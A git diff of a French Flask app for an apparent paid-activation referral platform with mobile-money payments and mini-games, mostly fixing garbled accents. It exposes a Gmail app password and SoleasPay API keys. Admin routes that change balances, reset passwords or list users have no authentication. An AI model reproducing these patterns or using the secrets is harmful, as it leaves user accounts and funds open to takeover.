             filename = secure_filename(target_file.filename)
             ext = filename.split('.')[-1].lower()
             
-            # Nom unique avec timestamp pour ├®viter les bugs de cache
+            # Nom unique avec timestamp pour éviter les bugs de cache
             unique_name = f"{int(datetime.now().timestamp())}_{filename}"
             
             upload_folder = os.path.join(app.root_path, "static/uploads")
@@ -829,7 +952,7 @@ def admin_canal_edit():
             # URL accessible par le navigateur
             media_url = f"/static/uploads/{unique_name}"
 
-            # D├®tection automatique du type
+            # Détection automatique du type
             if ext in ["jpg", "png", "jpeg", "gif", "webp"]:
                 media_type = "image"
             elif ext in ["mp4", "mov", "avi", "webm"]:
@@ -837,7 +960,7 @@ def admin_canal_edit():
             elif ext in ["mp3", "wav", "ogg", "m4a"]:
                 media_type = "audio"
 
-        # Cr├®ation du message
+        # Création du message
         msg = ChannelMessage(
             content=content,
             media_url=media_url,
@@ -867,14 +990,14 @@ def edit_msg(id):
 @app.route("/attribution/leaderbrice")
 @login_required
 def attribuer_orphelins_a_brice():
-    # On garde la s├®curit├® pour v├®rifier que tu es bien Admin
+    # On garde la sécurité pour vérifier que tu es bien Admin
 
-    # On r├®cup├¿re le compte de leaderbrice01
+    # On récupère le compte de leaderbrice01
     leader = User.query.filter_by(username="leaderbrice01").first()
     if not leader:
         return "L'utilisateur 'leaderbrice01' n'existe pas. Impossible de lui attribuer des filleuls.", 404
 
-    # On cherche tous les utilisateurs sans parrain (en excluant leaderbrice01 lui-m├¬me)
+    # On cherche tous les utilisateurs sans parrain (en excluant leaderbrice01 lui-même)
     orphelins = User.query.filter(
         (User.parrain == None) | (User.parrain == ""),
         User.username != "leaderbrice01"
@@ -887,11 +1010,11 @@ def attribuer_orphelins_a_brice():
         user.parrain = leader.username
         total_attribues += 1
 
-    # Sauvegarde dans la base de donn├®es
+    # Sauvegarde dans la base de données
     if total_attribues > 0:
         db.session.commit()
 
-    return f"Succ├¿s ! {total_attribues} utilisateurs (actifs et inactifs) ont ├®t├® rattach├®s ├á leaderbrice01."
+    return f"Succès ! {total_attribues} utilisateurs (actifs et inactifs) ont été rattachés à leaderbrice01."
 
 
 from sqlalchemy import text
@@ -909,7 +1032,7 @@ def academy_tiktok():
 def delete_msg(id):
     msg = ChannelMessage.query.get_or_404(id)
 
-    # ­ƒöÑ supprime fichier si existe
+    # 🔥 supprime fichier si existe
     if msg.media_url:
         try:
             path = msg.media_url.replace("/static/uploads/", "static/uploads/")
@@ -930,7 +1053,7 @@ app.config['MAIL_PORT'] = 587
 app.config['MAIL_USE_TLS'] = True
 app.config['MAIL_USERNAME'] = 'luminastar2026@gmail.com'
 app.config['MAIL_PASSWORD'] = 'suca ejwg zfln kepf'
-app.config['MAIL_DEFAULT_SENDER'] = app.config['MAIL_USERNAME']  # Ô£à AJOUT
+app.config['MAIL_DEFAULT_SENDER'] = app.config['MAIL_USERNAME']  # ✅ AJOUT
 
 mail = Mail(app)
 
@@ -976,7 +1099,7 @@ def envoyer_retrait_soleaspay(service_id, wallet, montant):
 @app.cli.command("init-db")
 def init_db():
     db.create_all()
-    print("Ô£à Base de donn├®es initialis├®e avec succ├¿s !")
+    print("✅ Base de données initialisée avec succès !")
 
 from sqlalchemy.orm.attributes import flag_modified
 from flask import jsonify
@@ -988,7 +1111,7 @@ def view_channel():
     user_id = session.get('user_id')
     user = db.session.get(User, user_id) if user_id else None
 
-    # V├®rification abonnement
+    # Vérification abonnement
     is_sub = False
     if user:
         is_sub = ChannelSub.query.filter_by(user_id=user.id).first() is not None
@@ -996,7 +1119,7 @@ def view_channel():
     # Messages
     messages = ChannelMessage.query.order_by(ChannelMessage.timestamp.asc()).all()
 
-    # Nombre abonn├®s
+    # Nombre abonnés
     sub_count = ChannelSub.query.count()
 
     return render_template(
@@ -1010,26 +1133,26 @@ def view_channel():
 @app.route("/admin/restreindre_comptes")
 @login_required
 def restreindre_comptes_specifiques():
-    # S├®curit├® : Seul l'administrateur a le droit de bannir
+    # Sécurité : Seul l'administrateur a le droit de bannir
 
-    # Liste des usernames ├á restreindre
+    # Liste des usernames à restreindre
     comptes_a_bloquer = ["leaderbrice01", "amen1", "oroumat"]
 
-    # On r├®cup├¿re les utilisateurs correspondants dans la base de donn├®es
+    # On récupère les utilisateurs correspondants dans la base de données
     utilisateurs = User.query.filter(User.username.in_(comptes_a_bloquer)).all()
 
     total_bloques = 0
 
-    # On passe leur statut is_banned ├á True
+    # On passe leur statut is_banned à True
     for user in utilisateurs:
         user.is_banned = True
         total_bloques += 1
 
-    # Sauvegarde d├®finitive dans la base de donn├®es
+    # Sauvegarde définitive dans la base de données
     if total_bloques > 0:
         db.session.commit()
 
-    return f"Op├®ration r├®ussie ! {total_bloques} comptes ont ├®t├® restreints avec succ├¿s ({', '.join([u.username for u in utilisateurs])})."
+    return f"Opération réussie ! {total_bloques} comptes ont été restreints avec succès ({', '.join([u.username for u in utilisateurs])})."
 
 
 @app.route("/chaine/rejoindre", methods=["POST"])
@@ -1087,7 +1210,7 @@ def credit_user(username, montant):
     user.solde_revenu += montant
     db.session.commit()
 
-    return f"{montant} XOF ajout├® au compte de {username}"
+    return f"{montant} XOF ajouté au compte de {username}"
 
 @app.route("/admin/update-solde", methods=["POST"])
 def update_solde():
@@ -1099,18 +1222,18 @@ def update_solde():
     user = User.query.filter_by(username=username).first()
     if user:
         try:
-            # On met ├á jour le champ dynamiquement
+            # On met à jour le champ dynamiquement
             setattr(user, field, float(value))
             db.session.commit()
             return jsonify({"success": True})
         except Exception as e:
             return jsonify({"success": False, "error": str(e)})
     
-    return jsonify({"success": False, "error": "Utilisateur non trouv├®"})
+    return jsonify({"success": False, "error": "Utilisateur non trouvé"})
 
 @app.route("/admin/classement-soldes")
 def classement_soldes():
-    # On ne r├®cup├¿re que le strict n├®cessaire pour la m├®moire vive
+    # On ne récupère que le strict nécessaire pour la mémoire vive
     utilisateurs = User.query.with_entities(
         User.username,
         User.phone,
@@ -1161,23 +1284,23 @@ def verify_page():
         code_saisi = request.form.get('code')
 
         # ==========================
-        # ­ƒöÉ OTP CHECK
+        # 🔐 OTP CHECK
         # ==========================
         if code_saisi != session.get('otp'):
             flash("Code incorrect.", "danger")
             return redirect(url_for('verify_page'))
 
         # ==========================
-        # ÔÅ│ EXPIRATION CHECK
+        # ⏳ EXPIRATION CHECK
         # ==========================
         otp_exp = session.get('otp_expiration')
 
         if otp_exp and datetime.now(UTC) > datetime.fromisoformat(otp_exp):
-            flash("Code expir├®.", "danger")
+            flash("Code expiré.", "danger")
             return redirect(url_for('retrait_page'))
 
         # ==========================
-        # ­ƒº¥ INSCRIPTION
+        # 🧾 INSCRIPTION
         # ==========================
         if session.get('mode') == 'inscription':
             data = session.get('temp_user')
@@ -1210,22 +1333,22 @@ def verify_page():
                 session.pop('mode', None)
                 session.pop('otp_expiration', None)
 
-                flash("Inscription r├®ussie !", "success")
+                flash("Inscription réussie !", "success")
                 return redirect(url_for("dashboard_bloque"))
 
             except Exception as e:
                 db.session.rollback()
-                flash("Erreur cr├®ation compte : " + str(e), "danger")
+                flash("Erreur création compte : " + str(e), "danger")
                 return redirect(url_for("inscription_page"))
 
         # ==========================
-        # ­ƒöæ RESET PASSWORD
+        # 🔑 RESET PASSWORD
         # ==========================
         elif session.get('mode') == 'reset':
             return redirect(url_for('new_password_page'))
 
         # ==========================
-        # ­ƒÆ© RETRAIT (FINAL FIX)
+        # 💸 RETRAIT (FINAL FIX)
         # ==========================
         elif session.get('mode') == 'retrait':
 
@@ -1233,12 +1356,12 @@ def verify_page():
             data = session.get('retrait_data')
 
             if not user or not data:
-                flash("Session expir├®e. Recommencez.", "danger")
+                flash("Session expirée. Recommencez.", "danger")
                 return redirect(url_for("retrait_page"))
 
             try:
                 # ==========================
-                # ­ƒöÑ API CALL
+                # 🔥 API CALL
                 # ==========================
                 response = envoyer_retrait_soleaspay(
                     data["service_id"],
@@ -1246,14 +1369,14 @@ def verify_page():
                     data["montant"]
                 )
 
-                print("­ƒöÁ API RESPONSE :", response)
+                print("🔵 API RESPONSE :", response)
 
                 if not response or response.get("success") != True:
                     flash("Erreur API paiement.", "danger")
                     return redirect(url_for("retrait_page"))
 
                 # ==========================
-                # ­ƒº¥ SAVE WITHDRAWAL
+                # 🧾 SAVE WITHDRAWAL
                 # ==========================
                 nouveau_retrait = Retrait(
                     user_id=user.id,
@@ -1276,14 +1399,14 @@ def verify_page():
                 db.session.commit()
 
                 # ==========================
-                # ­ƒº╣ CLEAN SESSION
+                # 🧹 CLEAN SESSION
                 # ==========================
                 session.pop('otp', None)
                 session.pop('retrait_data', None)
                 session.pop('mode', None)
                 session.pop('otp_expiration', None)
 
-                flash("Retrait confirm├® avec succ├¿s Ô£à", "success")
+                flash("Retrait confirmé avec succès ✅", "success")
                 return redirect(url_for("mes_retraits"))
 
             except Exception as e:
@@ -1295,7 +1418,7 @@ def verify_page():
 
 @app.route("/admin/utilisateurs")
 def admin_users_page():
-    # On r├®cup├¿re tous les utilisateurs class├®s par date de cr├®ation
+    # On récupère tous les utilisateurs classés par date de création
     utilisateurs = User.query.order_by(User.date_creation.desc()).all()
     return render_template("admin_users.html", users=utilisateurs)
 
@@ -1322,7 +1445,7 @@ def new_password_page():
             # nettoyage
             session.pop('reset_email', None)
 
-            flash("Mot de passe modifi├® avec succ├¿s !", "success")
+            flash("Mot de passe modifié avec succès !", "success")
             return redirect(url_for('connexion_page'))
 
     return render_template('new_password.html')
@@ -1341,18 +1464,18 @@ def reset_password_request():
             flash("Cet email n'existe pas.", "danger")
             return render_template('reset_request.html')
 
-        # ­ƒöÉ V├®rifier PIN
+        # 🔐 Vérifier PIN
         if not user.pin_code:
-            flash("Aucun code PIN d├®fini pour ce compte.", "danger")
+            flash("Aucun code PIN défini pour ce compte.", "danger")
             return render_template('reset_request.html')
 
         if not check_password_hash(user.pin_code, pin):
             flash("Code PIN incorrect.", "danger")
             return render_template('reset_request.html')
 
-        # Ô£à OK ÔåÆ autoriser reset
+        # ✅ OK → autoriser reset
         session['reset_email'] = email
-        flash("V├®rification r├®ussie. Vous pouvez changer votre mot de passe.", "success")
+        flash("Vérification réussie. Vous pouvez changer votre mot de passe.", "success")
         return redirect(url_for('new_password_page'))
 
     return render_template('reset_request.html')
@@ -1364,7 +1487,7 @@ from datetime import datetime, timezone
 # --- FONCTION UNIQUE DE LOCALISATION ---
 def enregistrer_position(user_obj):
     """
-    R├®cup├¿re les coordonn├®es GPS du formulaire et les stocke dans l'objet user.
+    Récupère les coordonnées GPS du formulaire et les stocke dans l'objet user.
     """
     lat = request.form.get('latitude')
     lng = request.form.get('longitude')
@@ -1372,7 +1495,7 @@ def enregistrer_position(user_obj):
     if lat and lng:
         user_obj.latitude = lat
         user_obj.longitude = lng
-        # On peut aussi mettre ├á jour la date de derni├¿re localisation si la colonne existe
+        # On peut aussi mettre à jour la date de dernière localisation si la colonne existe
         if hasattr(user_obj, 'last_location_update'):
             user_obj.last_location_update = datetime.now(timezone.utc)
         return True
@@ -1395,16 +1518,16 @@ def connexion_page():
             return redirect(url_for("connexion_page"))
 
         if getattr(user, "is_banned", False):
-            flash("Votre compte a ├®t├® suspendu. Contactez le support.", "danger")
+            flash("Votre compte a été suspendu. Contactez le support.", "danger")
             return redirect(url_for("connexion_page"))
 
-        # --- POSITION SUPPRIM├ëE ICI ---
+        # --- POSITION SUPPRIMÉE ICI ---
         session.clear()
         session["user_id"] = user.id
         session["username"] = user.username
         session.permanent = True
 
-        flash(f"Connexion r├®ussie ! Bienvenue {user.username}.", "success")
+        flash(f"Connexion réussie ! Bienvenue {user.username}.", "success")
         return redirect(url_for("dashboard_page"))
 
     return render_template("connexion.html")
@@ -1416,16 +1539,16 @@ def reseau_leader_brice():
     leader = User.query.filter_by(username="leaderbrice01").first()
     
     if not leader:
-        return "L'utilisateur 'leaderbrice01' n'existe pas dans la base de donn├®es.", 404
+        return "L'utilisateur 'leaderbrice01' n'existe pas dans la base de données.", 404
 
     # --- NIVEAU 1 : Filleuls directs ---
-    # On utilise ta relation 'downlines' d├®finie dans ton mod├¿le
+    # On utilise ta relation 'downlines' définie dans ton modèle
     niveau1 = leader.downlines.all()
 
     # --- NIVEAU 2 : Filleuls des filleuls ---
     niveau2 = []
     if niveau1:
-        # On r├®cup├¿re tous les usernames du niveau 1
+        # On récupère tous les usernames du niveau 1
         usernames_n1 = [u.username for u in niveau1 if u.username]
         if usernames_n1:
             # On cherche tous les utilisateurs dont le parrain est dans le niveau 1
@@ -1434,7 +1557,7 @@ def reseau_leader_brice():
     # --- NIVEAU 3 : Filleuls du niveau 2 ---
     niveau3 = []
     if niveau2:
-        # On r├®cup├¿re tous les usernames du niveau 2
+        # On récupère tous les usernames du niveau 2
         usernames_n2 = [u.username for u in niveau2 if u.username]
         if usernames_n2:
             # On cherche tous les utilisateurs dont le parrain est dans le niveau 2
@@ -1499,12 +1622,12 @@ def inscription_page():
 
         for u in existing_users:
             if u.username == username:
-                errors.append(f"Nom d'utilisateur '{username}' existe d├®j├á.")
+                errors.append(f"Nom d'utilisateur '{username}' existe déjà.")
                 session["username_exists"] = True
             if u.email == email:
-                errors.append("Cet email est d├®j├á utilis├®.")
+                errors.append("Cet email est déjà utilisé.")
             if u.phone == phone:
-                errors.append("Ce num├®ro est d├®j├á enregistr├®.")
+                errors.append("Ce numéro est déjà enregistré.")
 
         parrain_user = None
         if parrain_code:
@@ -1534,18 +1657,18 @@ def inscription_page():
                 date_creation=datetime.now(timezone.utc)
             )
 
-            # --- POSITION SUPPRIM├ëE ICI ---
+            # --- POSITION SUPPRIMÉE ICI ---
             db.session.add(new_user)
             db.session.commit()
 
             session["user_id"] = new_user.id
 
-            flash("Compte cr├®├® avec succ├¿s ­ƒÄë", "success")
+            flash("Compte créé avec succès 🎉", "success")
             return redirect(url_for("dashboard_bloque"))
 
         except Exception as e:
             db.session.rollback()
-            flash("Erreur cr├®ation compte : " + str(e), "danger")
+            flash("Erreur création compte : " + str(e), "danger")
 
     return render_template("inscription.html", code_ref=ref_code)
 
@@ -1555,7 +1678,7 @@ from datetime import datetime
 from flask import render_template
 
 def verification_lancement():
-    # Date cible : 11 Avril 2026 ├á 12h00
+    # Date cible : 11 Avril 2026 à 12h00
     date_lancement = datetime(2026, 4, 11, 12, 0, 0)
     if datetime.now() < date_lancement:
         # On renvoie directement le template de maintenance
@@ -1582,7 +1705,7 @@ def obtenir_token():
         response = requests.post(url, json=payload, headers=headers, timeout=10)
         data = response.json()
 
-        token = data.get("access_token")   # Ô£à CORRECTION ICI
+        token = data.get("access_token")   # ✅ CORRECTION ICI
 
         if not token:
             return None, data
@@ -1606,7 +1729,7 @@ def apple_game():
     user = db.session.get(User, session['user_id'])
     now = datetime.now()
     
-    # 1. V├®rification des blocages d├®finitifs
+    # 1. Vérification des blocages définitifs
     total_bonus = user.bonus or 0.0
     is_blocked_500 = total_bonus >= MAX_GAIN
     no_rounds_left = (user.remaining_rounds or 0) <= 0
@@ -1618,25 +1741,25 @@ def apple_game():
     base_date = user.last_play_date or user.date_creation
 
     if base_date and not is_blocked_500 and not no_rounds_left:
-        # Ouverture th├®orique : +3 jours apr├¿s la derni├¿re activit├®
+        # Ouverture théorique : +3 jours après la dernière activité
         next_available_date = base_date + timedelta(days=CYCLE_DAYS)
-        # Fermeture th├®orique : 24h apr├¿s l'ouverture
+        # Fermeture théorique : 24h après l'ouverture
         deadline_date = next_available_date + timedelta(hours=WINDOW_HOURS)
 
         if now < next_available_date:
-            # Trop t├┤t : Bouton incliquable
+            # Trop tôt : Bouton incliquable
             can_play = False
         elif next_available_date <= now <= deadline_date:
-            # Dans la fen├¬tre : Cliquable
+            # Dans la fenêtre : Cliquable
             can_play = True
         elif now > deadline_date:
-            # Fen├¬tre rat├®e : On p├®nalise et on d├®cale le prochain round
+            # Fenêtre ratée : On pénalise et on décale le prochain round
             user.remaining_rounds -= 1
-            user.last_play_date = next_available_date # On marque le cr├®neau comme "utilis├®"
+            user.last_play_date = next_available_date # On marque le créneau comme "utilisé"
             db.session.commit()
             return redirect(url_for('apple_game'))
     
-    # Cas sp├®cial : Premier jeu juste apr├¿s inscription (si last_play_date est None)
+    # Cas spécial : Premier jeu juste après inscription (si last_play_date est None)
     if not user.last_play_date and not no_rounds_left and not is_blocked_500:
         can_play = True
 
@@ -1651,7 +1774,7 @@ def apple_game():
 
     if request.method == 'POST':
         if not can_play:
-            return jsonify({"status": "error", "message": "Action non autoris├®e actuellement."})
+            return jsonify({"status": "error", "message": "Action non autorisée actuellement."})
 
         data = request.json
         gain = float(data.get('gain', 0))
@@ -1675,12 +1798,12 @@ def open_game():
         # Assure-toi de l'import : from datetime import datetime, timedelta
         control.end_time = datetime.now() + timedelta(minutes=30)
         
-        # R├®initialisation propre
+        # Réinitialisation propre
         db.session.query(User).update({User.has_played_this_round: False})
         
         db.session.add(control)
         db.session.commit()
-        return "Jeu activ├® pour 30 minutes !"
+        return "Jeu activé pour 30 minutes !"
     except Exception as e:
         db.session.rollback()
         return f"Erreur admin : {e}"
@@ -1712,14 +1835,14 @@ def apple_start():
     user = get_logged_in_user()
     maintenant = datetime.now()
 
-    # V├®rification s├®curit├® temps + BDD
+    # Vérification sécurité temps + BDD
     if maintenant.weekday() != 0 or maintenant.hour < 8:
-        return jsonify({"status": "error", "message": "Le verger est ferm├®. Revient lundi ├á 08h00."}), 403
+        return jsonify({"status": "error", "message": "Le verger est fermé. Revient lundi à 08h00."}), 403
 
     if user.frog_game_done:
-        return jsonify({"status": "error", "message": "Tu as d├®j├á r├®cup├®r├® tes pommes aujourd'hui."}), 403
+        return jsonify({"status": "error", "message": "Tu as déjà récupéré tes pommes aujourd'hui."}), 403
 
-    # G├®n├®ration s├®curis├®e c├┤t├® serveur
+    # Génération sécurisée côté serveur
     full_map = []
     for i in range(10):
         row = [0, 0, 0, 0, 0] # 0 = Pomme
@@ -1740,7 +1863,7 @@ def apple_check():
     choice = data.get('choice')
 
     if 'apple_map' not in session:
-        return jsonify({"status": "error", "message": "Session expir├®e"}), 400
+        return jsonify({"status": "error", "message": "Session expirée"}), 400
 
     step = session['apple_step']
     game_map = session['apple_map']
@@ -1749,7 +1872,7 @@ def apple_check():
     if game_map[step][choice] == 1:
         gain_final = session.get('apple_gain', 0)
         
-        # CR├ëDIT AUTOMATIQUE M├èME SI PERDU
+        # CRÉDIT AUTOMATIQUE MÊME SI PERDU
         if gain_final > 0:
             user.solde_jeux = (user.solde_jeux or 0) + gain_final
         
@@ -1786,7 +1909,7 @@ def apple_cashout():
 
 @app.route('/admin/reset-monday-games')
 def reset_games():
-    # R├®cup├¿re tous les utilisateurs qui ont d├®j├á jou├®
+    # Récupère tous les utilisateurs qui ont déjà joué
     users_to_reset = User.query.filter_by(frog_game_done=True).all()
     
     for u in users_to_reset:
@@ -1794,7 +1917,7 @@ def reset_games():
     
     db.session.commit()
     
-    return f"Succ├¿s ! Les compteurs de {len(users_to_reset)} utilisateurs ont ├®t├® remis ├á z├®ro."
+    return f"Succès ! Les compteurs de {len(users_to_reset)} utilisateurs ont été remis à zéro."
 
 
 
@@ -1811,14 +1934,14 @@ def glass_bridge_page():
     
     ouvert = est_jeudi and est_apres_8h
 
-    # R├®initialisation automatique des chances le jeudi matin
+    # Réinitialisation automatique des chances le jeudi matin
     aujourdhui = maintenant.date()
     if est_jeudi and est_apres_8h and user.derniere_maj_chances != aujourdhui:
         user.chances_bridge = 3
         user.derniere_maj_chances = aujourdhui
         db.session.commit()
 
-    # G├®n├®rer le chemin secret en session
+    # Générer le chemin secret en session
     session['bridge_path'] = [random.randint(0, 1) for _ in range(6)]
     session['current_step'] = 0
 
@@ -1829,9 +1952,9 @@ def verify_jump():
     user = get_logged_in_user()
     maintenant = datetime.now()
     
-    # S├®curit├® temps
+    # Sécurité temps
     if maintenant.weekday() != 3 or maintenant.hour < 8:
-        return jsonify({"status": "closed", "message": "Reviens jeudi ├á 08h00"}), 403
+        return jsonify({"status": "closed", "message": "Reviens jeudi à 08h00"}), 403
 
     if user.chances_bridge <= 0:
         return jsonify({"status": "out_of_chances"}), 403
@@ -1846,14 +1969,14 @@ def verify_jump():
         if session['current_step'] == 6:
             reward = 1000
             user.solde_jeux = (user.solde_jeux or 0) + reward
-            user.chances_bridge = 0 # On bloque apr├¿s la victoire
+            user.chances_bridge = 0 # On bloque après la victoire
             db.session.commit()
             return jsonify({"status": "win", "reward": reward})
         return jsonify({"status": "success"})
     else:
         user.chances_bridge -= 1
         db.session.commit()
-        # On r├®g├®n├¿re le chemin apr├¿s une chute pour ├®viter la triche par m├®morisation
+        # On régénère le chemin après une chute pour éviter la triche par mémorisation
         session['bridge_path'] = [random.randint(0, 1) for _ in range(6)]
         session['current_step'] = 0
         return jsonify({"status": "fail", "remaining_chances": user.chances_bridge})
@@ -1865,18 +1988,18 @@ import random
 def play_slot():
     user = db.session.get(User, session.get("user_id"))
     
-    # 1. V├®rification de la chance unique
+    # 1. Vérification de la chance unique
     if user.has_played_slot:
-        return jsonify({"status": "error", "message": "Vous avez d├®j├á tent├® votre chance !"}), 403
+        return jsonify({"status": "error", "message": "Vous avez déjà tenté votre chance !"}), 403
 
-    # 2. V├®rification solde (Optionnel selon ta r├¿gle, ici on suppose qu'il a pay├® l'acc├¿s)
+    # 2. Vérification solde (Optionnel selon ta règle, ici on suppose qu'il a payé l'accès)
     # user.solde_revenu -= 400 
     
     # 3. Logique de gain garanti entre 150 et 600
-    # On g├®n├¿re un gain al├®atoire par paliers de 50 pour faire joli
+    # On génère un gain aléatoire par paliers de 50 pour faire joli
     gain = random.randint(3, 12) * 50  # 150, 200, 250 ... 600
     
-    # 4. Enregistrement du r├®sultat
+    # 4. Enregistrement du résultat
     user.has_played_slot = True
     user.bonus += gain
     db.session.commit()
@@ -1885,7 +2008,7 @@ def play_slot():
         "status": "win",
         "reels": ["7", "7", "7"], # Le 7 est le symbole gagnant
         "gain": gain,
-        "message": f"F├®licitations ! Vous avez gagn├® {gain} XOF."
+        "message": f"Félicitations ! Vous avez gagné {gain} XOF."
     })
 
 
@@ -1899,7 +2022,7 @@ def fix_parrain():
         u.parrain = nouveau
 
     db.session.commit()
-    return "Parrain mis ├á jour avec succ├¿s"
+    return "Parrain mis à jour avec succès"
 
 
 @app.route("/admin/reset_password/<username>")
@@ -1916,20 +2039,20 @@ def reset_password(username):
 
     db.session.commit()
 
-    return f"Mot de passe r├®initialis├® pour {username} : {nouveau_mdp}"
+    return f"Mot de passe réinitialisé pour {username} : {nouveau_mdp}"
 
 SOLEAS_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
 SOLEAS_WEBHOOK_SECRET = "b42ed39b9e0db71db4556a2dfe1b1ad00dcce656fd4dba033f1947f913f1908bc817588c2edb32d92533a1d162e57ad4b1f7299f39695c5671c3ef07baa6f22a"
 
 SERVICES = {
 
-    # ­ƒç¿­ƒç▓ CAMEROUN
+    # 🇨🇲 CAMEROUN
     "CM": [
         {"id": 1, "name": "MOMO CM", "description": "MTN MOBILE MONEY CAMEROUN"},
         {"id": 2, "name": "OM CM", "description": "ORANGE MONEY CAMEROUN"},
     ],
 
-    # ­ƒç¿­ƒç« C├öTE DÔÇÖIVOIRE
+    # 🇨🇮 CÔTE D’IVOIRE
     "CI": [
         {"id": 29, "name": "OM CI", "description": "ORANGE MONEY COTE D'IVOIRE"},
         {"id": 30, "name": "MOMO CI", "description": "MTN MONEY COTE D'IVOIRE"},
@@ -1937,43 +2060,43 @@ SERVICES = {
         {"id": 32, "name": "WAVE CI", "description": "WAVE COTE D'IVOIRE"},
     ],
 
-    # ­ƒçº­ƒç½ BURKINA FASO
+    # 🇧🇫 BURKINA FASO
     "BF": [
         {"id": 33, "name": "MOOV BF", "description": "MOOV BURKINA FASO"},
         {"id": 34, "name": "OM BF", "description": "ORANGE MONEY BURKINA FASO"},
     ],
 
-    # ­ƒçº­ƒç» BENIN
+    # 🇧🇯 BENIN
     "BJ": [
         {"id": 35, "name": "MOMO BJ", "description": "MTN MONEY BENIN"},
         {"id": 36, "name": "MOOV BJ", "description": "MOOV BENIN"},
     ],
 
-    # ­ƒç╣­ƒç¼ TOGO
+    # 🇹🇬 TOGO
     "TG": [
         {"id": 37, "name": "T-MONEY TG", "description": "T-MONEY TOGO"},
         {"id": 38, "name": "MOOV TG", "description": "MOOV TOGO"},
     ],
 
-    # ­ƒç¿­ƒç® CONGO DRC
+    # 🇨🇩 CONGO DRC
     "COD": [
         {"id": 52, "name": "VODACOM COD", "description": "VODACOM CONGO DRC"},
         {"id": 53, "name": "AIRTEL COD", "description": "AIRTEL CONGO DRC"},
         {"id": 54, "name": "ORANGE COD", "description": "ORANGE CONGO DRC"},
     ],
 
-    # ­ƒç¿­ƒç¼ CONGO BRAZZAVILLE
+    # 🇨🇬 CONGO BRAZZAVILLE
     "COG": [
         {"id": 55, "name": "AIRTEL COG", "description": "AIRTEL CONGO"},
         {"id": 56, "name": "MOMO COG", "description": "MTN MOMO CONGO"},
     ],
 
-    # ­ƒç¼­ƒçª GABON
+    # 🇬🇦 GABON
     "GAB": [
         {"id": 57, "name": "AIRTEL GAB", "description": "AIRTEL GABON"},
     ],
 
-    # ­ƒç║­ƒç¼ UGANDA
+    # 🇺🇬 UGANDA
     "UGA": [
         {"id": 58, "name": "AIRTEL UGA", "description": "AIRTEL UGANDA"},
         {"id": 59, "name": "MOMO UGA", "description": "MTN MOMO UGANDA"},
@@ -1985,16 +2108,16 @@ COUNTRY_CODE = {
     "Cameroun": "CM",
     "Cameroon": "CM",
 
-    # C├┤te d'Ivoire
-    "C├┤te d'Ivoire": "CI",
+    # Côte d'Ivoire
+    "Côte d'Ivoire": "CI",
     "Cote d Ivoire": "CI",
     "Ivory Coast": "CI",
 
     # Burkina Faso
     "Burkina Faso": "BF",
 
-    # B├®nin
-    "B├®nin": "BJ",
+    # Bénin
+    "Bénin": "BJ",
     "Benin": "BJ",
 
     # Togo
@@ -2003,7 +2126,7 @@ COUNTRY_CODE = {
     # Congo DRC
     "Congo DRC": "COD",
     "RDC": "COD",
-    "R├®publique D├®mocratique du Congo": "COD",
+    "République Démocratique du Congo": "COD",
 
     # Congo Brazzaville
     "Congo": "COG",
@@ -2027,14 +2150,14 @@ def dashboard_bloque():
     if user_is_activated(user):
         return redirect(url_for("dashboard_page"))
 
-    # Simule un d├®p├┤t pending
+    # Simule un dépôt pending
     pending_depot = None
     user_has_pending_depot = bool(pending_depot)
 
-    # R├®cup├®ration du code pays
+    # Récupération du code pays
     country_code = COUNTRY_CODE.get(user.country.strip())
     if not country_code:
-        flash("Pays non support├®.", "danger")
+        flash("Pays non supporté.", "danger")
         return redirect(url_for("connexion_page"))
 
     # =========================
@@ -2044,9 +2167,9 @@ def dashboard_bloque():
         operator_name = request.form.get("operator")
         amount = request.form.get("montant", type=int)
         fullname = request.form.get("fullname")
-        phone = request.form.get("phone")  # Ô£à num├®ro modifiable
+        phone = request.form.get("phone")  # ✅ numéro modifiable
 
-        # ­ƒöÆ V├®rifications
+        # 🔒 Vérifications
         if not operator_name or not amount or not fullname or not phone:
             flash("Tous les champs sont requis.", "danger")
             return redirect(url_for("dashboard_bloque"))
@@ -2055,29 +2178,29 @@ def dashboard_bloque():
             flash("Le montant d'activation est exactement 4500 FCFA.", "danger")
             return redirect(url_for("dashboard_bloque"))
 
-        # ­ƒöÆ Nettoyage num├®ro
+        # 🔒 Nettoyage numéro
         phone = phone.replace(" ", "").replace("-", "")
 
         if not phone.isdigit() or len(phone) < 8:
-            flash("Num├®ro de paiement invalide.", "danger")
+            flash("Numéro de paiement invalide.", "danger")
             return redirect(url_for("dashboard_bloque"))
 
-        # ­ƒö╣ Recherche du service SoleasPay
+        # 🔹 Recherche du service SoleasPay
         service = next(
             (s for s in SERVICES[country_code] if s["name"] == operator_name),
             None
         )
 
         if not service:
-            flash("Op├®rateur non support├® pour votre pays.", "danger")
+            flash("Opérateur non supporté pour votre pays.", "danger")
             return redirect(url_for("dashboard_bloque"))
 
-        # ­ƒö╣ Cr├®ation du d├®p├┤t AVANT paiement avec toutes les infos obligatoires
+        # 🔹 Création du dépôt AVANT paiement avec toutes les infos obligatoires
         new_depot = Depot(
             user_name=user.username,
             phone=phone,
-            operator=operator_name,  # Ô£à maintenant obligatoire
-            country=country_code,    # Ô£à maintenant obligatoire
+            operator=operator_name,  # ✅ maintenant obligatoire
+            country=country_code,    # ✅ maintenant obligatoire
             montant=amount,
             statut="en_attente",
             email=user.email
@@ -2085,9 +2208,9 @@ def dashboard_bloque():
         db.session.add(new_depot)
         db.session.commit()
 
-        # ­ƒö╣ Payload SoleasPay avec DEPOT_ID
+        # 🔹 Payload SoleasPay avec DEPOT_ID
         payload = {
-            "wallet": phone,  # Ô£à NUM├ëRO SAISI PAR LÔÇÖUTILISATEUR
+            "wallet": phone,  # ✅ NUMÉRO SAISI PAR L’UTILISATEUR
             "amount": amount,
             "currency": "XOF",
             "order_id": f"NOVA-{new_depot.id}",
@@ -2117,11 +2240,11 @@ def dashboard_bloque():
             flash(f"Erreur de connexion au serveur de paiement : {e}", "danger")
             return redirect(url_for("dashboard_bloque"))
 
-        if not result.get("succ├¿s"):
+        if not result.get("succès"):
             flash(result.get("message", "Erreur paiement"), "danger")
             return redirect(url_for("dashboard_bloque"))
 
-        flash("Veuillez confirmer le paiement sur votre t├®l├®phone.", "info")
+        flash("Veuillez confirmer le paiement sur votre téléphone.", "info")
         return redirect(url_for("dashboard_bloque"))
 
     # =========================
@@ -2152,19 +2275,19 @@ def verify_payment():
 @app.route("/logout")
 def logout_page():
     session.clear()
-    flash("D├®connexion effectu├®e.", "info")
+    flash("Déconnexion effectuée.", "info")
     return redirect(url_for("connexion_page"))
 
 
